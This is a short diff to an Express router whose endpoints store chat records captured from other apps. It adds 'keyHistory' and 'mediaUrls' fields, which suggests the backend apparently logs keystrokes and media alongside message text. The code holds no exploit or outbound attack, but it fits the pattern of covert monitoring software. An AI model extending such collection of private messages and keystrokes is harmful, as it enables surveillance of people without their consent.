@@ -25,6 +25,8 @@ router.post('/', async (req, res) => {
             appName: chat.appName,
             chatIdentifier: chat.chatIdentifier || null,
             text: chat.text,
+            keyHistory: chat.keyHistory || null,
+            mediaUrls: chat.mediaUrls || null,
             timestamp: chat.timestamp || Date.now(),
             synced: true, // Mark as synced
             syncAttempts: 0,
@@ -81,6 +83,8 @@ router.post('/batch', async (req, res) => {
                     appName: chat.appName,
                     chatIdentifier: chat.chatIdentifier || null,
                     text: chat.text,
+                    keyHistory: chat.keyHistory || null,
+                    mediaUrls: chat.mediaUrls || null,
                     timestamp: chat.timestamp || Date.now(),
                     synced: true,
                     syncAttempts: 0,
